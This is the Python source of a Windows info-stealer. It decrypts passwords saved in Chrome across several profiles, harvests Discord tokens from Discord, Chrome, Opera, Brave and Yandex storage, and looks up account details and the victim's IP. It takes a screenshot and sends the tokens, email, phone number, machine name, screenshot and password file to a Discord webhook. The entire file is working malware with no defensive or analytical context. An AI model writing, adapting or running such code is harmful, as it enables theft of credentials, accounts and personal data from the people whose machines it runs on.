# coding: utf-8
import re
import os
import json
import requests
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import sqlite3
from dhooks import Webhook, File
from PIL import ImageGrab

local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv('TEMP')



def get_master_key(path_state):
    with open(path_state, "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"

paths_state = {
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Local State'
}

for platform_lol, path_lol in paths_state.items():
    if not os.path.exists(path_lol):
        continue
    master_key = get_master_key(path_lol)

paths_chrome = {
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Login Data',
    'Google Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
    'Google Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
    'Google Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
    'Google Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
    'Google Chrome6': local + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
    'Google Chrome7': local + '\\Google\\Chrome\\User Data\\Profile 6\\Login Data'
    }

for platform_lol, path_mdr in paths_chrome.items():
    if not os.path.exists(path_mdr):
        continue
    shutil.copy2(path_mdr, temp + "Loginvault.db")
    conn = sqlite3.connect(temp  + "Loginvault.db")
    cursor = conn.cursor()


    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    file_grab = open(local + '\\Google\\Password_Chrome.txt', 'w')
    for r in cursor.fetchall():
        url = r[0]
        username = r[1]
        encrypted_password = r[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)
        file_grab.write(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}" + "\n" + "*" * 50 + "\n")
    file_grab.close()

    cursor.close()
    conn.close()
    try:
        os.remove(temp + "Loginvault.db")
    except Exception as e:
        pass

paths = {
    'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
    'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb',
    'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
    'Google Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb',
    'Google Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb',
    'Google Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb',
    'Google Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb',
    'Google Chrome6': local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb',
    'Google Chrome7': local + '\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb',
    'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
    'Brave1': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Local Storage\\leveldb',
    'Brave2': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Local Storage\\leveldb',
    'Brave3': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Local Storage\\leveldb',
    'Brave4': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Local Storage\\leveldb',
    'Brave5': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Local Storage\\leveldb',
    'Brave6': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 6\\Local Storage\\leveldb',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',
    'Yandex1': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Local Storage\\leveldb',
    'Yandex2': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Local Storage\\leveldb',
    'Yandex3': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Local Storage\\leveldb',
    'Yandex4': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Local Storage\\leveldb',
    'Yandex5': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Local Storage\\leveldb',
    'Yandex6': local + '\\Yandex\\YandexBrowser\\User Data\\Profile 6\\Local Storage\\leveldb'
}


def find_token(path):
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
                    list_tokens.append(token)
    
    return tokens

list_tokens = []
def grab_all(token):
    tokeninfo = requests.get('https://discord.com/api/v8/users/@me', headers={'authorization': token}).json()
    r = requests.get('https://discord.com/api/v8/users/@me', headers={'authorization': token})
    if r.status_code != 200:
        return
    ipinfo = requests.get('http://ip-api.com/json/').json()
    nitro_type = json.loads(r.content)
    try:
        nitro_type['premium_type']
    except Exception:
        dnitro = "No tiene nitro"
    else:
        if nitro_type['premium_type'] == 1:
            dnitro = "Nitro Classic"
        elif nitro_type['premium_type'] == 2:
            dnitro = "Nitro Boost"
    payload = {
        "embeds": [{
            "author": {
                "name": f"{tokeninfo['username']}#{tokeninfo['discriminator']}",
                "icon_url": f"https://cdn.discordapp.com/avatars/{tokeninfo['id']}/{tokeninfo['avatar']}.jpg"
            },
            "fields": [{
                "name": "**Info Discord**",
                "value": f"ID: {tokeninfo['id']}\nEmail: {tokeninfo['email']}\nNumero de telefono: {tokeninfo['phone']}\nNitro: {dnitro}\nToken: {token}"
            },
                    {
                "name": "**Extra Info**",
                "value": f"Nombre de PC: {os.getenv('COMPUTERNAME')}\nNombre de session: {os.getlogin()}\nIP: {ipinfo['query']}"
            }]
        }]
    }
    requests.post(url_webhook, json=payload)
    hook = Webhook(url_webhook)
    screen = ImageGrab.grab()
    screen.save(local + '\\screen.png')
    screen.close()
    hook.send(file=File(local + "\\screen.png"))
    os.remove(local + '\\screen.png')
    with open(local + '\\Google\\Password_Chrome.txt', 'r') as fp:
        hook.send(file=File(fp, name=f"Passwords_Chrome_{tokeninfo['username']}.txt"))

for platform_lol, path in paths.items():
    if not os.path.exists(path):
        continue

    tokens = find_token(path)
    if len(tokens) > 0:
        for token in tokens:
            grab_all(token)
